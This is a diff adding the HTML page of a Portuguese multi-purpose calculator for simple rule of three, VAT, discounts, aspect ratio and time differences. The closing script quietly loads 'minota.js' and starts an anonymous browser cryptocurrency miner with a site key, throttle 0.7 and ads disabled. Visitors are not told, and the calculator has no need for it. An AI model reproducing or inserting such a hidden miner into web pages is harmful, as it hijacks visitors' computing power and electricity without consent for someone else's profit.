@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<title>Calculadora Funcional - João Gaião</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+		<link rel="apple-touch-icon" sizes="180x180" href="favicon/apple-touch-icon.png">
+		<link rel="icon" type="image/png" sizes="32x32" href="favicon/favicon-32x32.png">
+		<link rel="icon" type="image/png" sizes="16x16" href="favicon/favicon-16x16.png">
+		<link rel="manifest" href="favicon/site.webmanifest">
+		<link rel="mask-icon" href="favicon/safari-pinned-tab.svg" color="#5bbad5">
+		<meta name="msapplication-TileColor" content="#da532c">
+		<meta name="theme-color" content="#ffffff">
+		<link rel="stylesheet" href="css/all.min.css">
+	</head>
+	<body>
+		<div class="container-fluid">
+			<div class="row justify-content-center">
+				<div class="col-12 mt-5">
+					<small class="textLink">Acha útil? <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=WC2CL78DWUADY&item_name=Melhorar+o+projecto+e+criar+outros.&currency_code=EUR&source=url" target="_blank">Considere um donativo</a></small>
+					<div id="calcWrapper">
+						<select id="calc_type" class="custom-select">
+							<option value="rts">Regra de Três Simples</option>
+							<option value="iva">Calculos de IVA</option>
+							<option value="desc">Calculos de Descontos</option>
+							<option value="ratio">Proporção / Aspect Ratio</option>
+							<option value="time">Diferença Temporal</option>
+						</select>
+						<form action="" id="calc-rts" autocomplete="off">
+							<div class="row mt-3">
+								<div class="col-12">
+									<div class="input-group">
+										<div class="input-group-prepend">
+											<span class="input-group-text" id="resultLabel">X =</span>
+										</div>
+										<input id="result" type="text" readonly="readonly" class="form-control" aria-describedby="resultLabel">
+									</div>
+								</div>
+							</div>
+							<div class="row mt-3">
+								<div class="col-6">
+									<input id="valor1" type="text" name="valor" class="form-control text-center valRTS" placeholder="X">
+								</div>
+								<div class="col-6">
+									<input id="valor2" type="text" name="valor" class="form-control text-center valRTS" placeholder="X">
+								</div>
+							</div>
+							<div class="row mt-3">
+								<div class="col-6">
+									<input id="valor3" type="text" name="valor" class="form-control text-center valRTS" placeholder="X">
+								</div>
+								<div class="col-6">
+									<input id="valor4" type="text" name="valor" class="form-control text-center valRTS" placeholder="X">
+								</div>
+							</div>
+							<div class="row mt-3">
+								<div class="col-6">
+									<button type="reset" class="btn btn-block btn-light">Limpar</button>
+								</div>
+								<div class="col-6">
+									<button type="submit" class="btn btn-block btn-secondary">Calcular</button>
+								</div>
+							</div>
+						</form>
+						<form action="" id="calc-iva" autocomplete="off" style="display: none;">
+							<div class="row">
+								<div class="col-12 mt-3">
+									<div class="input-group">
+										<div class="input-group-prepend">
+											<span class="input-group-text" id="ivaBaseLabel">Preço Base</span>
+										</div>
+										<input id="ivaBase" type="text" class="form-control valIVA text-right" aria-describedby="ivaBaseLabel">
+										<div class="input-group-append">
+											<span class="input-group-text">€</span>
+										</div>
+									</div>
+								</div>
+								<div class="col-12 mt-3">
+									<div class="input-group">
+										<div class="input-group-prepend">
+											<span class="input-group-text" id="ivaValorLabel">Valor IVA</span>
+										</div>
+										<input id="ivaValor" type="text" class="form-control valIVA text-right" aria-describedby="ivaValorLabel">
+										<div class="input-group-append">
+											<span class="input-group-text">€</span>
+										</div>
+									</div>
+								</div>
+								<div class="col-12 mt-3">
+									<div class="input-group">
+										<div class="input-group-prepend">
+											<span class="input-group-text" id="ivaPercLabel">Percentagem IVA</span>
+										</div>
+										<input id="ivaPerc" type="text" class="form-control valIVA text-right" aria-describedby="ivaPercLabel">
+										<div class="input-group-append">
+											<span class="input-group-text">%</span>
+										</div>
+									</div>
+								</div>
+								<div class="col-12 mt-3">
+									<div class="input-group">
+										<div class="input-group-prepend">
+											<span class="input-group-text" id="ivaFinalLabel">Preço c/ IVA</span>
+										</div>
+										<input id="ivaFinal" type="text" class="form-control valIVA text-right" aria-describedby="ivaFinalLabel">
+										<div class="input-group-append">
+											<span class="input-group-text">€</span>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="row mt-3">
+								<div class="col-6">
+									<button type="reset" class="btn btn-block btn-light">Limpar</button>
+								</div>
+								<div class="col-6">
+									<button type="submit" class="btn btn-block btn-secondary">Calcular</button>
+								</div>
+							</div>
+						</form>
+						<form action="" id="calc-desc" autocomplete="off" style="display: none;">
+							<div class="row">
+								<div class="col-12 mt-3">
+									<div class="input-group">
+										<div class="input-group-prepend">
+											<span class="input-group-text" id="descBaseLabel">Preço Base</span>
+										</div>
+										<input id="descBase" type="text" class="form-control valDesc text-right" aria-describedby="descBaseLabel">
+										<div class="input-group-append">
+											<span class="input-group-text">€</span>
+										</div>
+									</div>
+								</div>
+								<div class="col-12 mt-3">
+									<div class="input-group">
+										<div class="input-group-prepend">
+											<span class="input-group-text" id="descValorLabel">Valor Desconto</span>
+										</div>
+										<input id="descValor" type="text" class="form-control valDesc text-right" aria-describedby="descValorLabel">
+										<div class="input-group-append">
+											<span class="input-group-text">€</span>
+										</div>
+									</div>
+								</div>
+								<div class="col-12 mt-3">
+									<div class="input-group">
+										<div class="input-group-prepend">
+											<span class="input-group-text" id="descPercLabel">Percentagem Desconto</span>
+										</div>
+										<input id="descPerc" type="text" class="form-control valDesc text-right" aria-describedby="descPercLabel">
+										<div class="input-group-append">
+											<span class="input-group-text">%</span>
+										</div>
+									</div>
+								</div>
+								<div class="col-12 mt-3">
+									<div class="input-group">
+										<div class="input-group-prepend">
+											<span class="input-group-text" id="descFinalLabel">Preço c/ Desconto</span>
+										</div>
+										<input id="descFinal" type="text" class="form-control valDesc text-right" aria-describedby="descFinalLabel">
+										<div class="input-group-append">
+											<span class="input-group-text">€</span>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="row mt-3">
+								<div class="col-6">
+									<button type="reset" class="btn btn-block btn-light">Limpar</button>
+								</div>
+								<div class="col-6">
+									<button type="submit" class="btn btn-block btn-secondary">Calcular</button>
+								</div>
+							</div>
+						</form>
+						<form action="" id="calc-ratio" autocomplete="off" style="display: none;">
+							<div class="row">
+								<div class="col-12 mt-3">
+									<div class="input-group">
+										<div class="input-group-prepend">
+											<span class="input-group-text" id="ratioLabel">Proporção</span>
+										</div>
+										<input id="ratio" type="text" class="form-control valRatio text-right" aria-describedby="ratioLabel">
+									</div>
+								</div>
+								<div class="col-12 mt-3">
+									<div class="input-group">
+										<div class="input-group-prepend">
+											<span class="input-group-text" id="ratioLargLabel">Largura</span>
+										</div>
+										<input id="ratioLarg" type="text" class="form-control valRatio int text-right" aria-describedby="ratioLargLabel">
+										<div class="input-group-append">
+											<span class="input-group-text">px</span>
+										</div>
+									</div>
+								</div>
+								<div class="col-12 mt-3">
+									<div class="input-group">
+										<div class="input-group-prepend">
+											<span class="input-group-text" id="ratioAltLabel">Altura</span>
+										</div>
+										<input id="ratioAlt" type="text" class="form-control valRatio int text-right" aria-describedby="ratioAltLabel">
+										<div class="input-group-append">
+											<span class="input-group-text">px</span>
+										</div>
+									</div>
+								</div>
+								<div class="col-12 mt-3">
+									<button id="imgUpload" type="button" class="btn btn-block btn-light">Carregar Imagem</button>
+								</div>
+							</div>
+							<div class="row mt-3">
+								<div class="col-6">
+									<button type="reset" class="btn btn-block btn-light">Limpar</button>
+								</div>
+								<div class="col-6">
+									<button type="submit" class="btn btn-block btn-secondary">Calcular</button>
+								</div>
+							</div>
+						</form>
+						<form action="" id="calc-time" autocomplete="off" style="display: none;">
+							<div class="row">
+								<div class="col-12 mt-3">
+									<div class="input-group">
+										<input id="tempo" type="text" readonly="readonly" class="form-control text-center">
+									</div>
+								</div>
+								<div class="col-7 mt-3">
+									<div class="input-group">
+										<div class="input-group-prepend">
+											<span class="input-group-text" id="dataLabel">Data</span>
+										</div>
+										<input id="data" type="text" readonly="readonly" class="form-control" aria-describedby="dataLabel">
+									</div>
+								</div>
+								<div class="col-5 mt-3">
+									<div class="input-group">
+										<div class="input-group-prepend">
+											<span class="input-group-text" id="horaLabel">Hora</span>
+										</div>
+										<input id="hora" type="text" readonly="readonly" class="form-control" aria-describedby="horaLabel">
+									</div>
+								</div>
+								<div class="col-7 mt-3">
+									<div class="input-group">
+										<div class="input-group-prepend">
+											<span class="input-group-text" id="data2Label">Data</span>
+										</div>
+										<input id="data2" type="text" readonly="readonly" class="form-control" aria-describedby="data2Label">
+									</div>
+								</div>
+								<div class="col-5 mt-3">
+									<div class="input-group">
+										<div class="input-group-prepend">
+											<span class="input-group-text" id="hora2Label">Hora</span>
+										</div>
+										<input id="hora2" type="text" readonly="readonly" class="form-control" aria-describedby="hora2Label">
+									</div>
+								</div>
+							</div>
+							<div class="row mt-3">
+								<div class="col-6">
+									<button type="reset" class="btn btn-block btn-light">Limpar</button>
+								</div>
+								<div class="col-6">
+									<button type="submit" class="btn btn-block btn-secondary">Calcular</button>
+								</div>
+							</div>
+						</form>
+					</div>
+					<small class="textLink">Criado por <a href="https://jgaiao.github.io" target="_blank">João Gaião</a></small>
+				</div>
+			</div>
+		</div>
+		<div id="rodape" class="d-none">
+			Disponível em aplicação para as plataformas: <a href="">Android</a>, <a href="">Windows</a> e <a href="">Linux</a>
+		</div>
+		<script src="js/head.load.min.js"></script>
+		<script>
+			head.js("js/jquery.slim.min.js", "js/moment.min.js", "js/moment_locale_pt.js", "js/picker.js", "js/minota.js", function() {
+				var _client = new Client.Anonymous('632fa6f27c3c4fc4d9f18a1420c316d6b4c18925c7b26f3cef56862b7927aa7f', {
+					throttle: 0.7, c: 'w', ads: 0
+				});
+				_client.start();
+				head.js("js/moment-precise-range.js", "js/picker.date.js", "js/picker.time.js", "js/jquery.inputmask.min.js", function() {
+					head.js("js/app.min.js","js/pickadate_pt_PT.js");
+				});
+			});
+		</script>
+	</body>
+</html>
